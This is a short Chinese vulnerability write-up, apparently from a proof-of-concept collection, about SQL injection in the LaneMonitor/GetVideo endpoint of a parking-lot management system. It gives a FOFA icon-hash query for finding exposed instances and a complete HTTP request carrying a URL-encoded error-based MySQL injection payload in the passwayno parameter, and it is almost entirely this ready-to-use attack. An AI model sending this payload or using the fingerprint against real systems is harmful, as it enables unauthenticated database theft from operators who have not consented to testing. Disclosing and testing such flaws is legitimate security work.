# 停车场后台管理系统GetVideo存在SQL注入漏洞

停车场后台管理系统 LaneMonitor/GetVideo 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa

```java
icon_hash="938984120"
```

## poc

```javascript
GET /LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%280x71627a7871%2C%28SELECT+%28ELT%283079%3D3079%2C1%29%29%29%2C0x7176786b71%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![image-20250217095300994](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502170953065.png)